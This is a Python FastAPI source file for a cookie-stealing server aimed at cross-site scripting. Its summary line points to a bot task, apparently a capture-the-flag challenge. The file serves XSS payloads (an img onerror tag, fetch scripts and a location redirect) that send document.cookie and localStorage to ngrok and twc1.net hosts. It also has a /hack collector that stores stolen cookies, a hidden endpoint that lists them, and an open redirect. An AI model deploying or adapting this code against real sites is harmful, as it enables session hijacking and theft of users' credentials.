from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.middleware.cors import CORSMiddleware


app = FastAPI(
    summary="http://109.233.56.90:11660/bot - задача"
)


app.add_middleware(
    CORSMiddleware, 
    allow_origins=["*"], 
    allow_credentials=True, 
    allow_methods=["*"], 
    allow_headers=["*"], 
)


data = []

l = []



@app.get("/redirect")
def redir(url: str):
    return RedirectResponse(url)



@app.get("/new")
def redir():
    return HTMLResponse(
        """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Document</title>
        </head>
        <body>
            <img src=x onerror=this.src='https://a259-159-255-36-14.ngrok-free.app/hack?'+document.cookie;>
        </body>
        </html>        
        """
    )

@app.get("/client_info/{id}")
def get_cookie(id: int):
    
    return HTMLResponse(l[id])


@app.get("/client_info")
def get_cookie(request: Request):
    client_host = request.client.host
    client_port = request.client.port
    headers = request.headers
    cookies = request.cookies
    query_params = request.query_params
    path_params = request.path_params
    method = request.method
    url = request.url
    base_url = request.base_url
    scope = request.scope
    state = request.state
    print(client_host, client_port, headers, cookies, query_params, path_params, method, url, base_url, scope, state)

    l.append(f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Document</title>
        </head>
        <body>
            <p>Client Host: {client_host}</p>
            <p>Client Port: {client_port}</p>
            <p>Headers: {headers}</p>
            <p>Cookies: {cookies}</p>
            <p>Query Params: {query_params}</p>
            <p>Path Params: {path_params}</p>
            <p>Method: {method}</p>
            <p>URL: {url}</p>
            <p>Base URL: {base_url}</p>
            <p>Scope: {scope}</p>
            <p>State: {state}</p>
            <script>fetch(`https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${{document.cookie}}`)</script>
            <script>fetch(`https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie=${{localStorage}}`)</script>
        </body>
        </html>
        """)

    return HTMLResponse(l[-1])

@app.get("/")
def get_cookie(request: Request):
    domain = request.url.hostname
    return HTMLResponse(
        """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Document</title>
        </head>
        <body>
            <script>document.location = 'https://080b-159-255-36-14.ngrok-free.app/hack?cookie='+document.cookie</script>
        </body>
        </html>
        """
    )


@app.get("/hack")
def get_cookie(cookie: str):
    data.append(cookie)
    return {"status": 200}

@app.get("/test")
def test(request: Request):
    cookie = request.cookies
    print(cookie)
    return RedirectResponse(f"https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie={cookie}")


@app.get("/klkfmwelkfmewlfnl/cookie")
def get_cookie_list():
    return data

